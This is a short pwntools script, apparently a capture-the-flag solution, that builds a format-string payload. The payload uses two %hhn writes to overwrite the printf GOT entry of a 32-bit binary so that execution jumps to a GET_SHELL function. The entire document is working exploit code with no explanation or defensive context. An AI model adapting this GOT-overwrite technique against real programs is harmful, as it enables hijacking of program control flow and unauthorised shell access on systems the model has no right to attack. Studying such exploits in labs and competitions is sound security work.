from pwn import *
import sys

GET_SHELL = 0x8048669
PRINTF_GOT = 0x804a010

payload = b""
payload += p32(PRINTF_GOT)
payload += p32(PRINTF_GOT+1)
payload += b"%97c"
payload += b"%1$hhn"
payload += b"%29c"
payload += b"%2$hhn"

sys.stdout.buffer.write(payload)
